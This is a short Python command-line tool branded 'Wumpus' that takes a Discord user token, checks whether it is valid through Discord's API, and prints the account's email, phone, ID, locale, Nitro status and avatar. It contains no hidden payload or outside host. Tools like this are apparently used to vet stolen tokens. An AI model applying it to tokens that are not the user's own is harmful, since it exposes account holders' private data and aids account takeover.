from pystyle import Center, Colorate, Colors, Anime
import colorama
import os
import requests
from datetime import datetime, timezone

os.system('cls')
print(Colorate.Horizontal(Colors.blue_to_cyan,"""
▄▄▄▄  ▄▄▄  ▄▄▄▄                                 
▀███  ███  ███▀                                 
 ███  ███  ███ ██ ██ ███▄███▄ ████▄ ██ ██ ▄█▀▀▀ 
 ███▄▄███▄▄███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ▀███▄ 
  ▀████▀████▀  ▀██▀█ ██ ██ ██ ████▀ ▀██▀█ ▄▄▄█▀ 
                              ██                
                              ▀▀                

                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                ┃ Author : Wumpus             ┃
                ┃ Discord: .gg/datas          ┃
                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
"""))

colorama.init(autoreset=True)

def ErrorModule(e):
    print(colorama.Fore.RED + f"Error: {e}")

def Error(e):
    print(colorama.Fore.RED + f"Error: {e}")

def ErrorToken():
    print(colorama.Fore.RED + "Invalid Token.")
    exit()

def ErrorChoice():
    print(colorama.Fore.RED + "Invalid Choice.")
    exit()

def Continue():
    input(colorama.Fore.GREEN + "Press Enter to continue...")

def Reset():
    pass  # Placeholder for reset logic if needed.

def current_time_hour():
    from datetime import datetime
    return datetime.now().strftime('%H:%M:%S')

def Title(title):
    print(colorama.Fore.CYAN + f"=== {title} ===")

def get_discord_info(token_discord):
    api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()
    
    response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord, 'Content-Type': 'application/json'})
    if response.status_code == 200:
        status = "Valid"
    else:
        status = "Invalid"

    username_discord = api.get('username', "None") + '#' + api.get('discriminator', "None")
    display_name_discord = api.get('global_name', "None")
    user_id_discord = api.get('id', "None")
    email_discord = api.get('email', "None")
    email_verified_discord = api.get('verified', "None")
    phone_discord = api.get('phone', "None")
    mfa_discord = api.get('mfa_enabled', "None")
    country_discord = api.get('locale', "None")
    avatar_discord = api.get('avatar', "None")
    avatar_decoration_discord = api.get('avatar_decoration_data', "None")
    public_flags_discord = api.get('public_flags', "None")
    flags_discord = api.get('flags', "None")
    banner_discord = api.get('banner', "None")
    banner_color_discord = api.get('banner_color', "None")
    accent_color_discord = api.get("accent_color", "None")
    nsfw_discord = api.get('nsfw_allowed', "None")

    try: 
        created_at_discord = datetime.fromtimestamp(((int(api.get('id', 'None')) >> 22) + 1420070400000) / 1000, timezone.utc)
    except: 
        created_at_discord = "None"

    try:
        if api.get('premium_type', 'None') == 0:
            nitro_discord = 'False'
        elif api.get('premium_type', 'None') == 1:
            nitro_discord = 'Nitro Classic'
        elif api.get('premium_type', 'None') == 2:
            nitro_discord = 'Nitro Boosts'
        elif api.get('premium_type', 'None') == 3:
            nitro_discord = 'Nitro Basic'
        else:
            nitro_discord = 'False'
    except:
        nitro_discord = "None"

    try: 
        avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id_discord}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{api['avatar']}.png"
    except: 
        avatar_url_discord = "None"
    
    return {
        "status": status,
        "username": username_discord,
        "display_name": display_name_discord,
        "user_id": user_id_discord,
        "created_at": created_at_discord,
        "country": country_discord,
        "email": email_discord,
        "verified": email_verified_discord,
        "phone": phone_discord,
        "nitro": nitro_discord,
        "avatar_url": avatar_url_discord,
    }

try:
    token_discord = input("Enter your token: ")
    print(colorama.Fore.CYAN + f"{current_time_hour()} Information Recovery...")

    user_info = get_discord_info(token_discord)

    print(f"""
    {colorama.Fore.GREEN}Status       : {user_info['status']}
    {colorama.Fore.GREEN}Username     : {user_info['username']}
    {colorama.Fore.GREEN}Display Name : {user_info['display_name']}
    {colorama.Fore.GREEN}Id           : {user_info['user_id']}
    {colorama.Fore.GREEN}Created      : {user_info['created_at']}
    {colorama.Fore.GREEN}Country      : {user_info['country']}
    {colorama.Fore.GREEN}Email        : {user_info['email']}
    {colorama.Fore.GREEN}Verified     : {user_info['verified']}
    {colorama.Fore.GREEN}Phone        : {user_info['phone']}
    {colorama.Fore.GREEN}Nitro        : {user_info['nitro']}
    {colorama.Fore.GREEN}Avatar URL   : {user_info['avatar_url']}
    """)

    Continue()

except Exception as e:
    Error(e)
